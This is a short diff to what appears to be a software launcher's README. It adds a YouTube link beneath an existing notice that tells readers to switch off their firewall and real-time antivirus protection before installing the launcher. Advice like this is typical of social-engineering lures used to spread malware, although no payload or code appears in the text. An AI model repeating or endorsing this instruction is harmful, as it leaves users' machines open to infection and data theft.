@@ -31,6 +31,7 @@
 
 # Important Notice ⚠️🙂
 ### Some security software may show warnings for newly released programs 🛡️😬 Turn off your'e firewall/realtime protection when installing the launcher 🙂🔍
+## https://www.youtube.com/watch?v=y4S_mF7GrcE
 
 # Support 🛠️😄
 
